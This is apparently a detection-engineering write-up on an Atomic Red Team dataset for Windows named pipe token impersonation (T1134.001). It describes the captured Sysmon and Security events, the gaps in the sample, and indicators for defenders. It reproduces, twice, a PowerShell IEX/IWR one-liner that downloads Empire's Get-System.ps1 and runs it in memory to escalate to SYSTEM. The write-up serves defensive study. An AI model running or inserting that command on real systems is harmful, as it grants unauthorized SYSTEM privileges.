# T1134.001-1: Token Impersonation/Theft — Named Pipe Client Impersonation

## Technique Context

T1134.001 Token Impersonation/Theft describes adversaries stealing or duplicating Windows access tokens to impersonate other users or processes. Access tokens are the kernel objects that define a process's security context — who it runs as and what privileges it holds. By impersonating a higher-privileged token, an attacker can escalate from a local user or service context to `NT AUTHORITY\SYSTEM` or domain administrator.

Named pipe client impersonation is one of the oldest and most reliable Windows privilege escalation primitives. When a named pipe server calls `ImpersonateNamedPipeClient()`, it temporarily assumes the security context of the connected pipe client. If the server is running as `SYSTEM` and tricks a higher-privileged process into connecting to its pipe, the server inherits the client's token. This underpins many classic Windows privilege escalation techniques including some variants of PrintSpoofer, PipePotato, and the Empire `Get-System` implementation.

This test uses the PowerShell Empire `Get-System` module with the `NamedPipe` technique:

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose
```

The script is downloaded from the BC-SECURITY Empire GitHub repository and executed in memory. `Get-System -Technique NamedPipe` creates a named pipe server, then coerces a privileged Windows service into connecting to that pipe, and calls `ImpersonateNamedPipeClient()` to steal the service's SYSTEM token.

## What This Dataset Contains

The dataset captures 37 Sysmon events, 4 Security events, and 127 PowerShell events recorded on ACME-WS06 with Windows Defender fully disabled.

The core technique indicators are present in both channels. Security EID 4688 records the spawned PowerShell child process with the full command line:

```
"powershell.exe" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/BC-SECURITY/Empire/f6efd5a963d424a1f983d884b637da868e5df466/data/module_source/privesc/Get-System.ps1' -UseBasicParsing); Get-System -Technique NamedPipe -Verbose}
```

Sysmon EID 1 records the same process with full hashes: PowerShell SHA256 `3247BCFD...`, IMPHASH `AFACF6DC...`.

Sysmon EID 10 (Process Accessed) records PowerShell accessing the spawned child with `GrantedAccess: 0x1FFFFF`. Both the outer test framework process and the child PowerShell process are recorded being accessed.

Sysmon EID 17 records two named pipe creations for the two PowerShell host processes:
- `\PSHost.134182390532941457.17804.DefaultAppDomain.powershell`
- `\PSHost.134182390621178102.17600.DefaultAppDomain.powershell`

These are the standard PSHost pipes. Notably, `Get-System -Technique NamedPipe` creates additional named pipes as part of its impersonation mechanism. Those pipes (with names like `\\.\pipe\[guid]` or service-specific names) should be present in the full dataset but were not included in the 20-event Sysmon sample shown here. Researchers should query the full dataset for Sysmon EID 17 events outside the PSHost pipe name format.

Sysmon EID 11 records the two standard PowerShell profile initialization files created under `NT AUTHORITY\SYSTEM`'s profile:
- `StartupProfileData-NonInteractive`
- `StartupProfileData-Interactive`

The PowerShell channel (127 events, EID 4104) contains the ART test framework boilerplate. The `Get-System.ps1` script is loaded via `IEX` in the child process. Script block logging for `Get-System.ps1` would appear in EID 4104 events from the child process's context; the 18 sample events shown are predominantly the test framework overhead blocks.

## What This Dataset Does Not Contain

This dataset does not contain the named pipe events created by `Get-System.ps1`'s impersonation mechanism — the custom pipes that the privilege escalation technique creates are not represented in the 20-event Sysmon sample. This is the most significant gap in the sample relative to the full dataset.

No Security EID 4624 (Logon) or EID 4672 (Special Logon) events are present that would confirm successful token impersonation and the resulting elevated context. If `Get-System` succeeded, a new SYSTEM logon context would be established, which on some configurations generates logon events. Their absence here may indicate the sample was drawn from events before or after the impersonation completed, or that the specific impersonation path used did not generate logon audit events.

No Sysmon EID 18 (Pipe Connected) events are in the sample, which would be expected for the client-side pipe connection that `Get-System` establishes.

Compared to the defended variant (36 Sysmon / 10 Security / 52 PowerShell), this dataset is almost identical in Sysmon (37 vs. 36) and Security (4 vs. 10), with a larger PowerShell channel (127 vs. 52). The near-identical Sysmon and Security counts are notable: token impersonation via named pipe is not blocked or differently logged by Defender; the difference is primarily in the PowerShell channel volume.

## Assessment

This dataset captures the network download and in-memory execution of a known offensive PowerShell privilege escalation module. The primary value is in the command-line indicators: the Empire GitHub URL, the pinned commit hash (`f6efd5a963d424a1f983d884b637da868e5df466`), and the function call `Get-System -Technique NamedPipe` are all present in the Security EID 4688 and Sysmon EID 1 records.

The URL and commit hash provide immediate threat-intelligence correlation value. The pinned commit hash is particularly useful: this specific Empire commit is a known indicator, and any process creation log containing it identifies the use of Empire privesc tooling.

Researchers should supplement this sample with the full dataset to obtain the named pipe events that are the most distinctive artifact of the impersonation technique itself.

## Detection Opportunities Present in This Data

**BC-SECURITY Empire URL in a PowerShell command line.** Security EID 4688 and Sysmon EID 1 record the GitHub URL `raw.githubusercontent.com/BC-SECURITY/Empire/.../Get-System.ps1` verbatim. This URL references a known offensive tool. Any process creation event containing this URL is a direct indicator of Empire privesc tool usage.

**`IEX (IWR ...)` pattern.** The `IEX (IWR '...' -UseBasicParsing)` idiom is a canonical PowerShell in-memory download-and-execute pattern. Combined with a URL pointing to a privesc module, this is high-confidence.

**`Get-System -Technique NamedPipe`.** The function call is present in the process creation command line. `Get-System` is a well-known Empire privilege escalation function; its invocation in any process creation log is a significant indicator.

**DNS query and outbound TLS to `raw.githubusercontent.com`.** The Sysmon EID 22 and EID 3 events for the download from GitHub (present in the T1134.001-2 dataset and expected here) would confirm active script download. Correlation between these network events and the process creation command line builds a complete picture.

**PowerShell-to-PowerShell spawning with Empire URL.** The outer test framework → child PowerShell chain running the Empire script is a compound indicator combining the double-hop PowerShell pattern with specific threat-intelligence markers.
